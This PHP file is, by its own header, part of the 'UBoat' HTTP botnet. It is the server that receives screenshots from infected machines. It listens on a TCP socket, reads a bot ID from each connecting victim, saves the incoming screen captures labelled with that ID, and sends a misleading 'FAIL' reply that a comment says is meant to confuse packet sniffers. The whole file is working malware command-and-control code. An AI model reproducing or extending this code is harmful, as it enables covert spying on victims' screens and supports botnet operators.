<?php

/**
 * This file is part of UBoat - HTTP Botnet Project
 */

function XORInputKey($input, $key, $inputLength, $keyLength)
{
    $output = [];
    for ($i = 0; $i < $inputLength; ++$i) {
        $output[] = $input[$i] ^ $key[$i % $keyLength];
    }

    return $output;
}
if (! file_exists('config.ini')) {
    return 'FAIL';
}

$params = parse_ini_file('config.ini', true);

$address = $params['screenshot']['address'];
$port = (int) $params['screenshot']['port'];
$imageMaxSize = (int) $params['screenshot']['max_size'];
$outputDirectory = $params['screenshot']['save_dir'];

$sock = socket_create(AF_INET, SOCK_STREAM, SOL_TCP);

if (false === $sock) {
    die();
}

if (false === socket_bind($sock, $address, $port)) {
    die();
}

if (false === socket_listen($sock, 100)) {
    die();
}

do {
    $client = socket_accept($sock);
    if (false === $client) {
        die();
    }

    $buffer = socket_read($client, 32, PHP_BINARY_READ);

    if (! is_numeric($buffer)) {
        die();
    }

    $botId = $buffer;

    $accept = 'ACCEPT\\1';

    socket_write($client, $accept, strlen($accept));

    socket_set_nonblock($client);

    $buffer = '';
    $chunk = '';
    //sketchy.
    do {
        $chunk = socket_read($client, $imageMaxSize, PHP_BINARY_READ);
        $buffer .= $chunk;
        usleep(200);
    } while (0 != strlen($chunk));

    $fileName = 'SCREENSHOT_'.$botId.'_'.date('m-d-Y-His').'.bmp';
    //if you want to, you can do compression to png here, would be much easier
    file_put_contents($outputDirectory.$fileName, $buffer);

    socket_write($client, 'FAIL', 4); // not an actual fail, just to fuck with packet sniffers
    socket_close($client);
} while (true);
